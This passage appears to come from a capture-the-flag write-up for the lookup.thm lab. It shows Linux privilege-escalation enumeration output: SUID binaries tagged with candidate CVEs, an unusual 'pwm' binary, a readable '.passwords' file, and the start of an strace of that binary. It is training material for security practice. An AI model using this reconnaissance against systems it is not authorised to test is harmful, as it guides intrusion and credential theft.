-rwsr-xr-x 1 root root 463K Aug  4  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jan 11  2024 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51K Jan 11  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SUID binary!)
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 87K Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 84K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 52K Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 67K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 55K May 30  2023 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 67K May 30  2023 /usr/bin/su
-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 39K May 30  2023 /usr/bin/umount  --->  BSD/Linux(08-1996)

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /snap/core20/1950/usr/bin/chage                                                                                      
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /snap/core20/1950/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Apr  3  2023 /snap/core20/1950/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K May 30  2023 /snap/core20/1950/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1950/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1950/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /snap/core20/1974/usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /snap/core20/1974/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Apr  3  2023 /snap/core20/1974/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K May 30  2023 /snap/core20/1974/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1974/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1974/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 15K Jan 11  2024 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 43K Jan 11  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 11  2024 /usr/sbin/unix_chkpwd
-rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SGID binary)
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root ssh 343K Aug  4  2023 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root tty 35K May 30  2023 /usr/bin/wall

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                         
files with acls in searched folders Not Found                                                                                                                  
                                                                                                                                                               
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                 
══╣ Current shell capabilities                                                                                                                                 
CapInh:  0x0000000000000000=                                                                                                                                   
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

╚ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                   
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/snap/core20/1950/usr/bin/ping = cap_net_raw+ep
/snap/core20/1974/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                 
                                                                                                                                                               
╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                         
/etc/ld.so.conf                                                                                                                                                
Content of /etc/ld.so.conf:                                                                                                                                    
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                                  
  - /usr/local/lib                                                                                                                                             
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                                                            
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                                                
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                               
total 44                                                                                                                                                       
drwxr-xr-x   2 root root 4096 Jan 11  2024 .
drwxr-xr-x 104 root root 4096 Mar 20 04:41 ..
-rw-r--r--   1 root root   96 Jan 11  2024 01-locale-fix.sh
-rw-r--r--   1 root root 1557 Jan 11  2024 Z97-byobu.sh
-rwxr-xr-x   1 root root 3417 Jan 11  2024 Z99-cloud-locale-test.sh
-rwxr-xr-x   1 root root  873 Jan 11  2024 Z99-cloudinit-warnings.sh
-rw-r--r--   1 root root  835 Jan 11  2024 apps-bin-path.sh
-rw-r--r--   1 root root  729 Jan 11  2024 bash_completion.sh
-rw-r--r--   1 root root 1003 Jan 11  2024 cedilla-portuguese.sh
-rw-r--r--   1 root root 1107 Jan 11  2024 gawk.csh
-rw-r--r--   1 root root  757 Jan 11  2024 gawk.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                   
                                                                                                                                                               
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 11  2024 sbin.dhclient                                                                                                        
-rw-r--r-- 1 root root  3202 Jan 11  2024 usr.bin.man
-rw-r--r-- 1 root root 28486 Jan 11  2024 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  2006 Jan 11  2024 usr.sbin.mysqld
-rw-r--r-- 1 root root  1575 Jan 11  2024 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1482 Jan 11  2024 usr.sbin.tcpdump

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                   
═╣ Credentials in fstab/mtab? ........... No                                                                                                                   
═╣ Can I read shadow files? ............. No                                                                                                                   
═╣ Can I read shadow plists? ............ No                                                                                                                   
═╣ Can I write shadow plists? ........... No                                                                                                                   
═╣ Can I read opasswd file? ............. No                                                                                                                   
═╣ Can I write in network-scripts? ...... No                                                                                                                   
═╣ Can I read root folder? .............. No                                                                                                                   
                                                                                                                                                               
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                         
/home/think/.bash_history
/home/think/.viminfo
/home/think/.passwords
/home/think/user.txt
/root/
/var/www
/var/www/lookup.thm/public_html/index.php
/var/www/lookup.thm/public_html/styles.css
/var/www/lookup.thm/public_html/login.php
/var/www/files.lookup.thm/public_html/index.php
/var/www/html/index.php

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r--r-- 1 root root 1408 Jan 11  2024 /var/www/lookup.thm/public_html/login.php                                                                             
-rw-r--r-- 1 root root 257 Jan 11  2024 /var/www/html/index.php
-rw-r--r-- 1 root root 706 Jan 11  2024 /var/www/files.lookup.thm/public_html/index.php
-rwxr-xr-x 1 root root 687 Jan 11  2024 /var/www/lookup.thm/public_html/styles.css
-rwxr-xr-x 1 root root 719 Jan 11  2024 /var/www/lookup.thm/public_html/index.php

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                               
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                               
/dev/mqueue                                                                                                                                                    
/dev/shm
/run/lock
/run/lock/apache2
/run/screen
/snap/core20/1950/run/lock
/snap/core20/1950/tmp
/snap/core20/1950/var/tmp
/snap/core20/1974/run/lock
/snap/core20/1974/tmp
/snap/core20/1974/var/tmp
/tmp
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/files.lookup.thm
/var/www/files.lookup.thm/public_html
/var/www/files.lookup.thm/public_html/elFinder
/var/www/html
/var/www/lookup.thm
/var/www/lookup.thm/public_html

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                               
                                                                                                                                                               


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                            
                            ╚═════════════════════════╝                                                                                                        
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                       
/usr/bin/rescan-scsi-bus.sh                                                                                                                                    
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2024-01-11+20:22:45.3851262400 /usr/src/linux-headers-5.4.0-152/kernel/gen_kheaders.sh                                                                         
2024-01-11+20:22:45.3771249970 /usr/src/linux-headers-5.4.0-152/usr/gen_initramfs_list.sh
2024-01-11+20:22:45.2371032780 /usr/src/linux-headers-5.4.0-152/scripts/tracing/ftrace-bisect.sh
2024-01-11+20:22:45.2371032780 /usr/src/linux-headers-5.4.0-152/scripts/tracing/draw_functrace.py
2024-01-11+20:22:45.2371032780 /usr/src/linux-headers-5.4.0-152/scripts/cc-can-link.sh
2024-01-11+20:22:45.2331026570 /usr/src/linux-headers-5.4.0-152/scripts/gcc-ld
2024-01-11+20:22:45.2331026570 /usr/src/linux-headers-5.4.0-152/scripts/adjust_autoksyms.sh
2024-01-11+20:22:45.2291020360 /usr/src/linux-headers-5.4.0-152/scripts/modules-check.sh
2024-01-11+20:22:45.2291020360 /usr/src/linux-headers-5.4.0-152/scripts/cleanpatch
2024-01-11+20:22:45.2251014160 /usr/src/linux-headers-5.4.0-152/scripts/stackusage
2024-01-11+20:22:45.2251014160 /usr/src/linux-headers-5.4.0-152/scripts/selinux/install_policy.sh
2024-01-11+20:22:45.2171001740 /usr/src/linux-headers-5.4.0-152/scripts/namespace.pl
2024-01-11+20:22:45.2171001740 /usr/src/linux-headers-5.4.0-152/scripts/mkmakefile
2024-01-11+20:22:45.2171001740 /usr/src/linux-headers-5.4.0-152/scripts/mkcompile_h
2024-01-11+20:22:45.2171001740 /usr/src/linux-headers-5.4.0-152/scripts/check_extable.sh
2024-01-11+20:22:45.2130995540 /usr/src/linux-headers-5.4.0-152/scripts/file-size.sh
2024-01-11+20:22:45.2090989340 /usr/src/linux-headers-5.4.0-152/scripts/gen_ksymdeps.sh
2024-01-11+20:22:45.1850952090 /usr/src/linux-headers-5.4.0-152/scripts/markup_oops.pl
2024-01-11+20:22:45.1850952090 /usr/src/linux-headers-5.4.0-152/scripts/headers_install.sh
2024-01-11+20:22:45.1850952090 /usr/src/linux-headers-5.4.0-152/scripts/extract-sys-certs.pl
2024-01-11+20:22:45.1810945890 /usr/src/linux-headers-5.4.0-152/scripts/gfp-translate
2024-01-11+20:22:45.1770939690 /usr/src/linux-headers-5.4.0-152/scripts/spdxcheck.py
2024-01-11+20:22:45.1770939690 /usr/src/linux-headers-5.4.0-152/scripts/headers_check.pl
2024-01-11+20:22:45.1770939690 /usr/src/linux-headers-5.4.0-152/scripts/extract-ikconfig
2024-01-11+20:22:45.1770939690 /usr/src/linux-headers-5.4.0-152/scripts/coccicheck
2024-01-11+20:22:45.1730933470 /usr/src/linux-headers-5.4.0-152/scripts/gcc-version.sh
2024-01-11+20:22:45.1730933470 /usr/src/linux-headers-5.4.0-152/scripts/checkpatch.pl
2024-01-11+20:22:45.1690927280 /usr/src/linux-headers-5.4.0-152/scripts/patch-kernel
2024-01-11+20:22:45.1650921070 /usr/src/linux-headers-5.4.0-152/scripts/kmsg-doc
2024-01-11+20:22:45.1610914870 /usr/src/linux-headers-5.4.0-152/scripts/decode_stacktrace.sh
2024-01-11+20:22:45.1570908650 /usr/src/linux-headers-5.4.0-152/scripts/extract-module-sig.pl
2024-01-11+20:22:45.1530902450 /usr/src/linux-headers-5.4.0-152/scripts/profile2linkerlist.pl
2024-01-11+20:22:45.1490896250 /usr/src/linux-headers-5.4.0-152/scripts/show_delta
2024-01-11+20:22:45.1490896250 /usr/src/linux-headers-5.4.0-152/scripts/faddr2line
2024-01-11+20:22:45.1450890030 /usr/src/linux-headers-5.4.0-152/scripts/extract_xc3028.pl
2024-01-11+20:22:45.1410883820 /usr/src/linux-headers-5.4.0-152/scripts/tools-support-relr.sh
2024-01-11+20:22:45.1410883820 /usr/src/linux-headers-5.4.0-152/scripts/package/mkspec
2024-01-11+20:22:45.1410883820 /usr/src/linux-headers-5.4.0-152/scripts/package/builddeb
2024-01-11+20:22:45.1410883820 /usr/src/linux-headers-5.4.0-152/scripts/checksyscalls.sh
2024-01-11+20:22:45.1210852800 /usr/src/linux-headers-5.4.0-152/scripts/package/mkdebian
2024-01-11+20:22:45.1210852800 /usr/src/linux-headers-5.4.0-152/scripts/package/buildtar
2024-01-11+20:22:45.1210852800 /usr/src/linux-headers-5.4.0-152/scripts/dtc/dt_to_config
2024-01-11+20:22:45.1050827990 /usr/src/linux-headers-5.4.0-152/scripts/dtc/dtx_diff
2024-01-11+20:22:45.0530747300 /usr/src/linux-headers-5.4.0-152/scripts/dtc/update-dtc-source.sh
2024-01-11+20:22:45.0490741100 /usr/src/linux-headers-5.4.0-152/scripts/sphinx-pre-install
2024-01-11+20:22:45.0450734900 /usr/src/linux-headers-5.4.0-152/scripts/get_dvb_firmware
2024-01-11+20:22:45.0410728690 /usr/src/linux-headers-5.4.0-152/scripts/gcc-goto.sh
2024-01-11+20:22:45.0410728690 /usr/src/linux-headers-5.4.0-152/scripts/depmod.sh
2024-01-11+20:22:45.0410728690 /usr/src/linux-headers-5.4.0-152/scripts/checkkconfigsymbols.py
2024-01-11+20:22:44.9730622660 /usr/src/linux-headers-5.4.0-152/scripts/find-unused-docs.sh
2024-01-11+20:22:44.9570597550 /usr/src/linux-headers-5.4.0-152/scripts/checkincludes.pl
2024-01-11+20:22:44.9530591270 /usr/src/linux-headers-5.4.0-152/scripts/setlocalversion
2024-01-11+20:22:44.9530591270 /usr/src/linux-headers-5.4.0-152/scripts/headerdep.pl
2024-01-11+20:22:44.9530591270 /usr/src/linux-headers-5.4.0-152/scripts/checkstack.pl
2024-01-11+20:22:44.9490584990 /usr/src/linux-headers-5.4.0-152/scripts/atomic/gen-atomic-long.sh
2024-01-11+20:22:44.9490584990 /usr/src/linux-headers-5.4.0-152/scripts/atomic/gen-atomic-instrumented.sh
2024-01-11+20:22:44.9490584990 /usr/src/linux-headers-5.4.0-152/scripts/atomic/check-atomics.sh
2024-01-11+20:22:44.9490584990 /usr/src/linux-headers-5.4.0-152/scripts/atomic/atomics.tbl
2024-01-11+20:22:44.9450578710 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/set_release
2024-01-11+20:22:44.9450578710 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/dec_unless_positive
2024-01-11+20:22:44.9450578710 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/acquire
2024-01-11+20:22:44.9450578710 /usr/src/linux-headers-5.4.0-152/scripts/atomic/atomic-tbl.sh
2024-01-11+20:22:44.9410572430 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/try_cmpxchg
2024-01-11+20:22:44.9410572430 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/sub_and_test
2024-01-11+20:22:44.9410572430 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/read_acquire
2024-01-11+20:22:44.9410572430 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/inc_unless_negative
2024-01-11+20:22:44.9410572430 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/dec_and_test
2024-01-11+20:22:44.9410572430 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/andnot
2024-01-11+20:22:44.9370566150 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/release
2024-01-11+20:22:44.9370566150 /usr/src/linux-headers-5.4.0-152/scripts/atomic/fallbacks/inc_and_test
sort: write failed: 'standard output': Broken pipe
sort: write error

╔══════════╣ Unexpected in root
/swap.img                                                                                                                                                      
/seddc5fn0

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog                                                                                                                                                
/var/log/auth.log
/var/log/kern.log

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#logrotate-exploitation                                                       
logrotate 3.14.0                                                                                                                                               

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/www-data (limit 20)
                                                                                                                                                               
╔══════════╣ Files inside others home (limit 20)
/home/think/.cache/motd.legal-displayed                                                                                                                        
/home/think/.profile
/home/think/.bashrc
/home/think/.passwords
/home/think/.bash_logout
/home/think/user.txt
/var/www/lookup.thm/public_html/index.php
/var/www/lookup.thm/public_html/styles.css
/var/www/lookup.thm/public_html/login.php
/var/www/files.lookup.thm/public_html/index.php
/var/www/html/index.php

╔══════════╣ Searching installed mail applications
                                                                                                                                                               
╔══════════╣ Mails (limit 50)
                                                                                                                                                               
╔══════════╣ Backup folders
drwxr-xr-x 2 root root 3 Apr 15  2020 /snap/core20/1950/var/backups                                                                                            
total 0

drwxr-xr-x 2 root root 3 Apr 15  2020 /snap/core20/1974/var/backups
total 0

drwxr-xr-x 2 root root 4096 Apr 17  2024 /var/backups
total 64
-rw-r--r-- 1 root root 40220 Jan 11  2024 apt.extended_states.0
-rw-r--r-- 1 root root  4374 Jan 11  2024 apt.extended_states.1.gz
-rw-r--r-- 1 root root  4234 Jan 11  2024 apt.extended_states.2.gz
-rw-r--r-- 1 root root  4007 Jan 11  2024 apt.extended_states.3.gz
-rw-r--r-- 1 root root  3971 Jan 11  2024 apt.extended_states.4.gz


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 2743 Jan 11  2024 /etc/apt/sources.list.curtin.old                                                                                      
-rw-r--r-- 1 root root 39448 Jul 21  2023 /usr/lib/mysql/plugin/component_mysqlbackup.so
-rw-r--r-- 1 root root 1413 Jan 11  2024 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc
-rw-r--r-- 1 root root 1802 Jan 11  2024 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 44048 Jul 25  2023 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 9833 Jan 11  2024 /usr/lib/modules/5.4.0-152-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 9073 Jan 11  2024 /usr/lib/modules/5.4.0-152-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9833 Jan 11  2024 /usr/lib/modules/5.4.0-156-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 9073 Jan 11  2024 /usr/lib/modules/5.4.0-156-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 11886 Jan 11  2024 /usr/share/info/dir.old
-rw-r--r-- 1 root root 2756 Jan 11  2024 /usr/share/man/man8/vgcfgbackup.8.gz
-rwxr-xr-x 1 root root 226 Jan 11  2024 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 7867 Jan 11  2024 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 392817 Jan 11  2024 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 0 Jan 11  2024 /usr/src/linux-headers-5.4.0-152-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jan 11  2024 /usr/src/linux-headers-5.4.0-152-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 237873 Jan 11  2024 /usr/src/linux-headers-5.4.0-152-generic/.config.old
-rw-r--r-- 1 root root 0 Jan 11  2024 /usr/src/linux-headers-5.4.0-156-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jan 11  2024 /usr/src/linux-headers-5.4.0-156-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 237873 Jan 11  2024 /usr/src/linux-headers-5.4.0-156-generic/.config.old
-rwxr-xr-x 1 root root 1086 Jan 11  2024 /usr/src/linux-headers-5.4.0-152/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-156/tools/testing/selftests/net/tcp_fastopen_backup_key.sh

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001                                                      
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001

 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)                                                                                   
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                                
                                                                                                                                                               
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                     
total 20K
drwxr-xr-x  5 root     root     4.0K Jan 11  2024 .
drwxr-xr-x 14 root     root     4.0K Jul 30  2023 ..
drwxr-xr-x  3 www-data www-data 4.0K Jul 30  2023 files.lookup.thm
drwxr-xr-x  2 www-data www-data 4.0K Jan 11  2024 html
drwxr-xr-x  3 www-data www-data 4.0K Jul 30  2023 lookup.thm

/var/www/files.lookup.thm:
total 12K

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 landscape landscape 0 Jan 11  2024 /var/lib/landscape/.cleanup.user                                                                               
-rw-r--r-- 1 root root 220 Jan 11  2024 /etc/skel/.bash_logout
-rw------- 1 root root 0 Jan 11  2024 /etc/.pwd.lock
-rw------- 1 root root 0 Jun 13  2023 /snap/core20/1950/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1950/etc/skel/.bash_logout
-rw------- 1 root root 0 Jun 22  2023 /snap/core20/1974/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1974/etc/skel/.bash_logout
-rw-r----- 1 root think 525 Jul 30  2023 /home/think/.passwords
-rwxr-xr-x 1 think think 220 Jun  2  2023 /home/think/.bash_logout
-rw-r--r-- 1 root root 2 Mar 20 04:41 /run/cloud-init/.ds-identify.result

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
                                                                                                                                                               
╔══════════╣ Searching passwords in history files
                                                                                                                                                               
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                                                     
/home/think/.passwords
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/component_validate_password.so
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-38.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                               
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                               
╔══════════╣ Searching passwords inside logs (limit 70)
[   14.150085] systemd[1]: Started Forward Password Requests to Wall Directory Watch.                                                                          
[   15.766365] systemd[1]: Started Forward Password Requests to Wall Directory Watch.



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                             
                                ╚════════════════╝                                                                                                             
Regexes to search for API keys aren't activated, use param '-r' 

```

### Full STRACE

```
strace -f /home/kali/pwm     
execve("/home/kali/pwm", ["/home/kali/pwm"], 0x7ffcf021d0d8 /* 57 vars */) = 0
brk(NULL)                               = 0x55fe97aec000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f34c1d6a000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=100562, ...}) = 0
mmap(NULL, 100562, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f34c1d51000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000\237\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
fstat(3, {st_mode=S_IFREG|0755, st_size=2003408, ...}) = 0
